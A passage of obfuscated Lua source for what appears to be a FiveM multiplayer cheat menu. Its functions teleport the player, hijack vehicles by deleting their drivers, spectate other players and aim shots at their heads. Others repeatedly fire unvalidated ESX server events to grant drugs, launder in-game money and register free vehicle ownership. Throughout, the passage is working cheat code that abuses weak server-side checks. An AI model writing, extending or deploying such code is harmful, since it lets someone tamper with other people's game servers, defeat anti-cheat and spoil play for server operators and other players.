        SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, Pryorbypessed2, Pryorbypessed2, Pryorbypessed2, Pryorbypessed3)
        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, Pryorbypessed3, Pryorbypessed2)
        SetPlayerInvincible(ped, Pryorbypessed2)
        TriggerEvent('playerSpawned', coords.x, coords.y, coords.z)
        ClearPedBloodDamage(ped)
      end

      local function teleporttocoords()
        local pizdax = Pryyyorbypass("Enter X pos", "", 100)
        local pizday = Pryyyorbypass("Enter Y pos", "", 100)
        local pizdaz = Pryyyorbypass("Enter Z pos", "", 100)
        if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
          if	IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
          else
            entity = GetPlayerPed(-1)
          end
          if entity then
            SetEntityCoords(entity, pizdax + 0.5, pizday + 0.5, pizdaz + 0.5, 1, 0, 0, 1)
            notify("~g~Teleportado to coords!", Pryorbypessed2)
          end
        else
          notify("~b~Invalido coords!", Pryorbypessed3)
        end
      end

      local function drawcoords()
        local name = Pryyyorbypass("Enter Blip Name", "", 100)
        if name == "" then
          notify("~b~Invalido Blip Name!", Pryorbypessed3)
          return drawcoords()
        else
          local pizdax = Pryyyorbypass("Enter X pos", "", 100)
          local pizday = Pryyyorbypass("Enter Y pos", "", 100)
          local pizdaz = Pryyyorbypass("Enter Z pos", "", 100)
          if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
            local blips = {
              {colour=75, id=84},
            }
            for _, info in pairs(blips) do
              info.blip = AddBlipForCoord(pizdax + 0.5, pizday + 0.5, pizdaz + 0.5)
              SetBlipSprite(info.blip, info.id)
              SetBlipDisplay(info.blip, 4)
              SetBlipScale(info.blip, 0.9)
              SetBlipColour(info.blip, info.colour)
              SetBlipAsShortRange(info.blip, Pryorbypessed3)
              BeginTextCommandSetBlipName("STRING")
              AddTextComponentString(name)
              EndTextCommandSetBlipName(info.blip)
            end
          else
            notify("~b~Invalid coords!", Pryorbypessed3)
          end
        end
      end

      local function teleporttonearestvehicle()
        local playerPed = GetPlayerPed(-1)
        local playerPedPos = GetEntityCoords(playerPed, Pryorbypessed3)
        local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, Pryorbypessed3), 1000.0, 0, 4)
        local NearestVehiclePos = GetEntityCoords(NearestVehicle, Pryorbypessed3)
        local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, Pryorbypessed3), 1000.0, 0, 16384)
        local NearestPlanePos = GetEntityCoords(NearestPlane, Pryorbypessed3)
        notify("~y~Wait...", Pryorbypessed2)
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
          notify("~b~No Vehicle Found", Pryorbypessed3)
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
          if IsVehicleSeatFree(NearestPlane, -1) then
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, Pryorbypessed2)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, Pryorbypessed2)
          else
            local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, Pryorbypessed2)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, Pryorbypessed2)
          end
          notify("~g~Teleported Into Nearest Vehicle!", Pryorbypessed2)
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
          if IsVehicleSeatFree(NearestVehicle, -1) then
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, Pryorbypessed2)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, Pryorbypessed2)
          else
            local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, Pryorbypessed2)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, Pryorbypessed2)
          end
          notify("~g~Teleported Into Nearest Vehicle!", Pryorbypessed2)
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
          if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, Pryorbypessed2)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, Pryorbypessed2)
            else
              local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, Pryorbypessed2)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, Pryorbypessed2)
            end
          elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestPlane, -1) then
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, Pryorbypessed2)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, Pryorbypessed2)
            else
              local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, Pryorbypessed2)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, Pryorbypessed2)
            end
          end
          notify("~g~Teleportado para Nearest Vehicle!", Pryorbypessed2)
        end
      end

      local function TeleportToWaypoint()
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
          local blipIterator = GetBlipInfoIdIterator(8)
          local blip = GetFirstBlipInfoId(8, blipIterator)
          WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
          wp = Pryorbypessed3
        else
          notify("~b~Nenhum Lugar marcado!", Pryorbypessed3)
        end

        local zHeigt = 0.0
        height = 1000.0
        while wp do
          Citizen.Wait(0)
          if wp then
            if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
            (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
            then
              entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
            else
              entity = GetPlayerPed(-1)
            end

            SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
            FreezeEntityPosition(entity, Pryorbypessed3)
            local Pos = GetEntityCoords(entity, Pryorbypessed3)

            if zHeigt == 0.0 then
              height = height - 25.0
              SetEntityCoords(entity, Pos.x, Pos.y, height)
              bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
            else
              SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
              FreezeEntityPosition(entity, Pryorbypessed2)
              wp = Pryorbypessed2
              height = 1000.0
              zHeigt = 0.0
              notify("~g~Teleportado to waypoint!", Pryorbypessed2)
              break
            end
          end
        end
      end


      local function spawnvehicle()
        local ModelName = Pryyyorbypass("Digite o Nome do Veiculo :", "", 100)
        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
          RequestModel(ModelName)
          while not HasModelLoaded(ModelName) do
            Citizen.Wait(0)
		local cw = GetPryyyorbypass("Seu Rg", "", 100)
		end
          local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), Pryorbypessed3, Pryorbypessed3)
          SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
        else
          notify("~b~Modelo Invalido!!", Pryorbypessed3)
        end
      end

      local function repairvehicle()
        SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2))
        SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0.0)
        SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0)
        SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), Pryorbypessed2)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0)
        SetVehicleUndriveable(vehicle,Pryorbypessed2)
      end

      local function repairengine()
        SetVehicleEngineHealth(vehicle, 1000)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0)
        SetVehicleUndriveable(vehicle,Pryorbypessed2)
      end

      local function carlicenseplaterino()
        local playerPed = GetPlayerPed(-1)
        local playerVeh = GetVehiclePedIsIn(playerPed, Pryorbypessed3)
        local result = Pryyyorbypass("Enter the plate license you want", "", 100)
        if result ~= "" then
          SetVehicleNumberPlateText(playerVeh, result)
        end
      end

      function hweed()
        TSE("esx_drugs:startHarvestWeed")
        Pryorbypessed1('esx_illegal_drugs:startHarvestWeed')
        Pryorbypessed1('esx_drugs:pickedUpCannabis')
      end

      function tweed()
        TSE("esx_drugs:startTransformWeed")
        Pryorbypessed1('esx_illegal_drugs:startTransformWeed')
        Pryorbypessed1('esx_drugs:processCannabis')
      end

      function sweed()
        TSE("esx_drugs:startSellWeed")
        TSE("esx_illegal_drugs:startSellWeed")
      end

      function hcoke()
        Pryorbypessed1('esx_drugs:startHarvestCoke')
        Pryorbypessed1('esx_drugs:startHarvestCoke')
        Pryorbypessed1('esx_drugs:startHarvestCoke')
        Pryorbypessed1('esx_drugs:startHarvestCoke')
        Pryorbypessed1('esx_illegal_drugs:startHarvestCoke')
        Pryorbypessed1('esx_illegal_drugs:startHarvestCoke')
        Pryorbypessed1('esx_illegal_drugs:startHarvestCoke')
        Pryorbypessed1('esx_illegal_drugs:startHarvestCoke')
    end
    
    function tcoke()
        Pryorbypessed1('esx_drugs:startTransformCoke')
        Pryorbypessed1('esx_drugs:startTransformCoke')
        Pryorbypessed1('esx_drugs:startTransformCoke')
        Pryorbypessed1('esx_drugs:startTransformCoke')
        Pryorbypessed1('esx_illegal_drugs:startTransformCoke')
        Pryorbypessed1('esx_illegal_drugs:startTransformCoke')
        Pryorbypessed1('esx_illegal_drugs:startTransformCoke')
        Pryorbypessed1('esx_illegal_drugs:startTransformCoke')
    end
    
    function scoke()
        Pryorbypessed1('esx_drugs:startSellCoke')
        Pryorbypessed1('esx_drugs:startSellCoke')
        Pryorbypessed1('esx_drugs:startSellCoke')
        Pryorbypessed1('esx_drugs:startSellCoke')
        Pryorbypessed1('esx_illegal_drugs:startSellCoke')
        Pryorbypessed1('esx_illegal_drugs:startSellCoke')
        Pryorbypessed1('esx_illegal_drugs:startSellCoke')
        Pryorbypessed1('esx_illegal_drugs:startSellCoke')
    end
    
    function hmeth()
        Pryorbypessed1('esx_drugs:startHarvestMeth')
        Pryorbypessed1('esx_drugs:startHarvestMeth')
        Pryorbypessed1('esx_drugs:startHarvestMeth')
        Pryorbypessed1('esx_drugs:startHarvestMeth')
        Pryorbypessed1('esx_illegal_drugs:startHarvestMeth')
        Pryorbypessed1('esx_illegal_drugs:startHarvestMeth')
        Pryorbypessed1('esx_illegal_drugs:startHarvestMeth')
        Pryorbypessed1('esx_illegal_drugs:startHarvestMeth')
        Pryorbypessed1('MF_MobileMeth:RewardPlayers')
    end
    
    function tmeth()
        Pryorbypessed1('esx_drugs:startTransformMeth')
        Pryorbypessed1('esx_drugs:startTransformMeth')
        Pryorbypessed1('esx_drugs:startTransformMeth')
        Pryorbypessed1('esx_drugs:startTransformMeth')
        Pryorbypessed1('esx_illegal_drugs:startTransformMeth')
        Pryorbypessed1('esx_illegal_drugs:startTransformMeth')
        Pryorbypessed1('esx_illegal_drugs:startTransformMeth')
        Pryorbypessed1('esx_illegal_drugs:startTransformMeth')
    end
    
    function smeth()
        Pryorbypessed1('esx_drugs:startSellMeth')
        Pryorbypessed1('esx_drugs:startSellMeth')
        Pryorbypessed1('esx_drugs:startSellMeth')
        Pryorbypessed1('esx_drugs:startSellMeth')
        Pryorbypessed1('esx_illegal_drugs:startSellMeth')
        Pryorbypessed1('esx_illegal_drugs:startSellMeth')
        Pryorbypessed1('esx_illegal_drugs:startSellMeth')
        Pryorbypessed1('esx_illegal_drugs:startSellMeth')
    end
    
    function hopi()
        Pryorbypessed1('esx_drugs:startHarvestOpium')
        Pryorbypessed1('esx_drugs:startHarvestOpium')
        Pryorbypessed1('esx_drugs:startHarvestOpium')
        Pryorbypessed1('esx_drugs:startHarvestOpium')
        Pryorbypessed1('esx_illegal_drugs:startHarvestOpium')
        Pryorbypessed1('esx_illegal_drugs:startHarvestOpium')
        Pryorbypessed1('esx_illegal_drugs:startHarvestOpium')
        Pryorbypessed1('esx_illegal_drugs:startHarvestOpium')
    end
    
    function topi()
        Pryorbypessed1('esx_drugs:startTransformOpium')
        Pryorbypessed1('esx_drugs:startTransformOpium')
        Pryorbypessed1('esx_drugs:startTransformOpium')
        Pryorbypessed1('esx_drugs:startTransformOpium')
        Pryorbypessed1('esx_illegal_drugs:startTransformOpium')
        Pryorbypessed1('esx_illegal_drugs:startTransformOpium')
        Pryorbypessed1('esx_illegal_drugs:startTransformOpium')
        Pryorbypessed1('esx_illegal_drugs:startTransformOpium')
    end
    
    function sopi()
        Pryorbypessed1('esx_drugs:startSellOpium')
        Pryorbypessed1('esx_drugs:startSellOpium')
        Pryorbypessed1('esx_drugs:startSellOpium')
        Pryorbypessed1('esx_drugs:startSellOpium')
        Pryorbypessed1('esx_illegal_drugs:startSellOpium')
        Pryorbypessed1('esx_illegal_drugs:startSellOpium')
        Pryorbypessed1('esx_illegal_drugs:startSellOpium')
        Pryorbypessed1('esx_illegal_drugs:startSellOpium')
    end

    function mataaspalarufe()
      Pryorbypessed1('esx_blanchisseur:startWhitening', 85)
      Pryorbypessed1('esx_blanchisseur:washMoney', 100)
      Pryorbypessed1('esx_blackmoney:washMoney')
      Pryorbypessed1('esx_moneywash:withdraw', 100)
      Pryorbypessed1('laundry:washcash')
  end

      function matanumaispalarufe()
        TSE("esx_drugs:stopHarvestCoke")
        TSE("esx_drugs:stopTransformCoke")
        TSE("esx_drugs:stopSellCoke")
        TSE("esx_drugs:stopHarvestMeth")
        TSE("esx_drugs:stopTransformMeth")
        TSE("esx_drugs:stopSellMeth")
        TSE("esx_drugs:stopHarvestWeed")
        TSE("esx_drugs:stopTransformWeed")
        TSE("esx_drugs:stopSellWeed")
        TSE("esx_drugs:stopHarvestOpium")
        TSE("esx_drugs:stopTransformOpium")
        TSE("esx_drugs:stopSellOpium")
        notify("~b~Everything is now stopped.", Pryorbypessed2)
      end

function doshit(playerVeh)
  RequestControl(playerVeh)
      SetVehicleHasBeenOwnedByPlayer(playerVeh, Pryorbypessed2)
      SetEntityAsMissionEntity(playerVeh, Pryorbypessed2, Pryorbypessed2)
      StartVehicleAlarm(playerVeh)
      DetachVehicleWindscreen(playerVeh)
      SetVehicleGravity(playerVeh, Pryorbypessed2)
end

	  function matacumparamasini()
		local ModelName = Pryyyorbypass("Enter Vehicle Spawn Name", "", 100)
		local NewPlate = Pryyyorbypass("Enter Vehicle Licence Plate", "", 100)
	
		if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
				RequestModel(ModelName)
				while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
				end
	
				local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), Pryorbypessed3, Pryorbypessed3)
				SetVehicleNumberPlateText(veh, NewPlate)
				local vehProps = ESX.Game.GetVehicleProperties(veh)
				TSE("esx_vehicleshop:setVehicleOwned", vehProps)
				notify("~g~~h~Success", Pryorbypessed2)
		else
				notify("~b~~h~Model is not valid !", Pryorbypessed3)
		end
	end

      function daojosdinpatpemata()
        local playerPed = GetPlayerPed(-1)
        local playerVeh = GetVehiclePedIsIn(playerPed, Pryorbypessed3)
        if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
          SetVehicleOnGroundProperly(playerVeh)
          notify("~g~Vehicle Flipped!", Pryorbypessed2)
        else
          notify("~b~You Aren't In The Driverseat Of A Vehicle!", Pryorbypessed3)
        end
      end


      function stringsplit(inputstr, sep)
        if sep == Pryorbypessed then
          sep = "%s"
        end
        local t = {}
        i = 1
        for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
          t[i] = str
          i = i + 1
        end
        return t
      end

      local Spectating = Pryorbypessed2

     
	 function SpectatePlayer(PlayerIdx)
        local playerPed = PlayerPedId(1)
        Spectating = not Spectating
        local targetPed = GetPlayerPed(player)

        if (Spectating) then
          local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, Pryorbypessed2))

          RequestCollisionAtCoord(targetx, targety, targetz)
          NetworkSetInSpectatorMode(Pryorbypessed3, targetPed)

          notify("Spectating " .. GetPlayerName(player), Pryorbypessed2)
        else
          local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, Pryorbypessed2))

          RequestCollisionAtCoord(targetx, targety, targetz)
          NetworkSetInSpectatorMode(Pryorbypessed2, targetPed)

          notify("Stopped Spectating " .. GetPlayerName(player), Pryorbypessed2)
        end
      end


      function ShootPlayer(player)
        local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, Pryorbypessed3)
      end

      function MaxOut(veh)
        SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0)
        SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 7)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 1) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 2) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 3) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 4) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 5) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 6) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 7) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 8) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 9) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 10) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 11) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 12) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 13) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 14, 16, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 15) - 2, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 16) - 1, Pryorbypessed2)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 17, Pryorbypessed3)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 18, Pryorbypessed3)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 19, Pryorbypessed3)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 20, Pryorbypessed3)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 21, Pryorbypessed3)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 22, Pryorbypessed3)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 23, 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 24, 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 25) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 27) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 28) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 30) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 33) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 34) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 35) - 1, Pryorbypessed2)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 38) - 1, Pryorbypessed3)
        SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 1)
        SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), Pryorbypessed2)
        SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 5)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, Pryorbypessed3)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, Pryorbypessed3)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, Pryorbypessed3)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, Pryorbypessed3)
        SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
      end

      function DelVeh(veh)
        SetEntityAsMissionEntity(Object, 1, 1)
        DeleteEntity(Object)
        SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 1, 1)
        DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2))
      end


      function Clean(veh)
        SetVehicleDirtLevel(veh, 15.0)
      end

      function Clean2(veh)
        SetVehicleDirtLevel(veh, 1.0)
      end
      function ApplyForce(entity, direction)
        ApplyForceToEntity(entity, 3, direction, 0, 0, 0, Pryorbypessed2, Pryorbypessed2, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3)
      end

      function RequestControlOnce(entity)
        if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
          return Pryorbypessed3
        end
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), Pryorbypessed3)
        return NetworkRequestControlOfEntity(entity)
      end

      function RequestControl(entity)
        Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
          tick = tick+1
          Wait(0)
        end
        return tick <= 12
        end)
      end

      function Oscillate(entity, position, angleFreq, dampRatio)
        local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq*angleFreq))
        local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
        local targetPos = SubVectors(pos1, pos2)

        ApplyForce(entity, targetPos)
      end

      function getEntity(player)
        local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
        return entity
      end

      function GetInputMode()
        return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
      end



      function DrawSpecialText(m_text, showtime)
        SetTextEntry_2("STRING")
        AddTextComponentString(m_text)
        DrawSubtitleTimed(showtime, 1)
      end




      Citizen.CreateThread(function()

      while Pryorbypessed3 do
        Wait( 1 )
        for id = 0, 128 do

          if NetworkIsPlayerActive( id ) and GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then

            ped = GetPlayerPed( id )
            blip = GetBlipFromEntity( ped )

            x1, y1, z1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), Pryorbypessed3 ) )
            x2, y2, z2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), Pryorbypessed3 ) )
            distance = math.floor(GetDistanceBetweenCoords(x1,  y1,  z1,  x2,  y2,  z2,  Pryorbypessed3))

            headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), Pryorbypessed2, Pryorbypessed2, "", Pryorbypessed2 )
            wantedLvl = GetPlayerWantedLevel( id )

            if showsprite then
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, Pryorbypessed3 )
              if wantedLvl then

                Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, Pryorbypessed3 )
                Citizen.InvokeNative( 0xCF228E2AA03099C3, headId, wantedLvl )

              else

                Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, Pryorbypessed2 )

              end
            else
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, Pryorbypessed2 )
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, Pryorbypessed2 )
